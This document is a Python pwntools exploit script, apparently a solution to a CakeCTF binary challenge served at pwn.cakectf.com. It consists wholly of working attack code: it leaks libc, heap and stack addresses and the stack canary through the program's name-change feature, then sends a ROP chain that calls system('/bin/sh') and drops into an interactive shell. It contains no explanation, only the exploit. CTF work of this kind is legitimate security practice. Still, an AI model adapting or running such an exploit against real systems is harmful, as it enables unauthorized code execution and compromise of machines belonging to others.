#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
#"""
HOST = "pwn.cakectf.com"
PORT = 9004
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
got_strcpy = elf.got["strcpy"]
got_strdup = elf.got["strdup"]

rdi_ret = 0x403a33
only_ret = 0x40101a

libc = ELF('./libc-2.31.so')
off_strdup = libc.symbols["strdup"]
off_system = libc.symbols["system"]
off_malloc_hook = libc.symbols["__malloc_hook"]
off_binsh = next(libc.search(b"/bin/sh"))

def create(spec, age, name):
	conn.sendlineafter(">> ", "1")
	conn.sendlineafter("]: ", str(spec))
	conn.sendlineafter(": ", str(age))
	conn.sendafter(": ", name)

def show():
	conn.sendlineafter(">> ", "2")

def change(age, name):
	conn.sendlineafter(">> ", "3")
	conn.sendlineafter(": ", str(age))
	conn.sendafter(": ", name)

def exploit():
	# libc address leak
	create(2, 0xdead, "AAAA\n")
	payload = "A"*0x20
	payload += "\n"
	change(got_strdup, payload)
	show()
	conn.recvuntil("Name: ")
	
	libc_strdup = u64(conn.recvline()[:-1]+b"\x00\x00")
	libc_base = libc_strdup - off_strdup
	libc_malloc_hook = libc_base + off_malloc_hook
	top_chunk = libc_base + off_malloc_hook + 0x70
	libc_system = libc_base + off_system
	libc_binsh = libc_base + off_binsh
	
	# heap address leak
	create(2, 0xdead, "AAAA\n")
	payload = "A"*0x20
	payload += "\n"
	change(top_chunk, payload)
	show()
	conn.recvuntil("Name: ")
	addr_heap = conn.recvline()[:-1]
	addr_heap = u64(addr_heap + b"\x00"*(8-len(addr_heap)))
	
	# do strdup
	create(2, 0xdead, "AAAA\n")
	payload = "A"*0x20
	payload += "\x5f\n"
	change(0x7eadbeefdeadbeef, payload)
	change(1,"A\n")
	
	# stack address leak
	create(2, 0xdead, "AAAA\n")
	payload = "A"*0x20
	payload += "\n"
	change(addr_heap+0x10, payload)
	show()
	conn.recvuntil("Name: ")
	
	addr_stack = conn.recvline()[:-1]
	addr_stack = u64(addr_stack + b"\x00"*(8-len(addr_stack)))
	
	# canary leak
	create(2, 0xdead, "AAAA\n")
	payload = "A"*0x20
	payload += "\n"
	change(addr_stack+0xa0+1, payload)
	show()
	conn.recvuntil("Name: ")
	
	canary = conn.recv(7)
	canary = u64(b"\x00"+canary)
	
	payload = b"A"*0x88
	payload += p64(canary)
	payload += p64(0)*3
	payload += p64(only_ret)
	payload += p64(rdi_ret)
	payload += p64(libc_binsh)
	payload += p64(libc_system)
	payload += b"\n"

	create(0, 0xdead, payload)
	conn.sendlineafter(">> ", "4")
	print(hex(libc_base))
	print(hex(addr_heap))
	print(hex(addr_stack))
	print(hex(canary))
	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
